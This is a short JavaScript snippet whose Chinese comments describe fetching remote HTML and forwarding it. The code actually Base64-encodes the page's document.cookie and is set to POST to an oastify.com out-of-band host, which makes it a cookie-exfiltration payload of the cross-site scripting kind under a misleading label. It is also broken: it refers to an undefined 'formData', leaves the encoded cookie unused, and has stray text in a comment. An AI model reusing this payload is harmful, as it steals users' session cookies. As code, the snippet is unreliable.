/**
 * 步骤1：获取远程HTML内容
 * 步骤2：将HTML转为Base64编码fs gg
 * 步骤3：POST发送Base64数据到目标地址
 */
async function fetchAndForwardHTML() {
  // -------------------------- 配置参数 --------------------------
  const htmlSourceUrl = btoa(document.cookie) // 要获取的远程HTML地址（替换为实际地址）
  const forwardTargetUrl = 'https://rnil9xz763268sygs22tkyssyj4as7gw.oastify.com/upload'; // 转发的目标POST地址（替换为实际地址）
  // ----------------------------------------------------------------
 
    
  fetch(forwardTargetUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded" // 表单格式
      },
      body: formData // 直接传入URLSearchParams对象
    })
}
// -------------------------- 调用执行 --------------------------
fetchAndForwardHTML();
